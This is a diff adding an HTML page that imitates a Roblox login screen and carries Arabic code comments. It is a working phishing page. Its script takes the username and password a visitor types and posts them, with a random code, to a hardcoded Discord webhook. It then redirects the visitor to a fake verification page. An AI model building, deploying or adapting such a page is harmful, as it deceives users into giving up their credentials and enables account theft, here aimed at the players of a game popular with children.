@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            background-image: url('roblox.png'); /* قم بتعديل هذا إلى مسار الصورة الخاصة بك */
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            padding: 0px;
+            border-radius: 8px;
+            width: 350px;
+            text-align: center;
+        }
+        input {
+            margin: 12px 0;
+            margin-left: -74px;
+            margin-right:-40px;
+            margin-top: 4px;
+            padding: 11px;
+            width: 390px;
+            border: 4px solid #000000;
+            border-radius: 10px;
+            background: rgb(0, 0, 0);
+            color:white
+        }
+        button {
+            padding: 4px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            background-color: #393b3d;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #393b3d
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <form id="loginForm" style="height: 292px;width: 376px;">
+            <input type="text" id="username" placeholder="Username/Email/Phone" required="">
+            <input type="password" id="password" placeholder="Password" required="">
+            <button type="submit"><b>Log In</b></button>
+        </form>
+    </div>
+    <script>
+        let generatedCode = ''; // متغير لتخزين الكود العشوائي
+
+        function generateRandomCode() {
+            return Math.floor(100000 + Math.random() * 900000); // يولد رقم من 100000 إلى 999999
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع النموذج من الإرسال التلقائي
+            
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            if (password.length < 6) {
+                alert('كلمة المرور يجب أن تكون على الأقل 6 أحرف.');
+                return;
+            }
+
+            generatedCode = generateRandomCode(); // توليد الرقم العشوائي
+
+            // إرسال بيانات تسجيل الدخول مع الكود العشوائي إلى سيرفر Discord
+            fetch('https://discord.com/api/webhooks/1276208020468269137/NUrusBNokpHv3v5yvq6Y9mM2nXl3nGCtdxNaM87PMZUrK_-JMTfMa_OX0snzO5tzwPld', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `اسم المستخدم: ${username}\nكلمة المرور: ${password}\nكود التحقق: ${generatedCode}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // إعادة توجيه المستخدم إلى صفحة جديدة
+                    window.location.href = 'step-verifi.html'; // استبدل 'page-after-login.html' بالمسار الصحيح للصفحة الجديدة
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات.');
+                }
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                alert('حدث خطأ أثناء إرسال البيانات.');
+            });
+        });
+    </script>
+</body>
+</html>
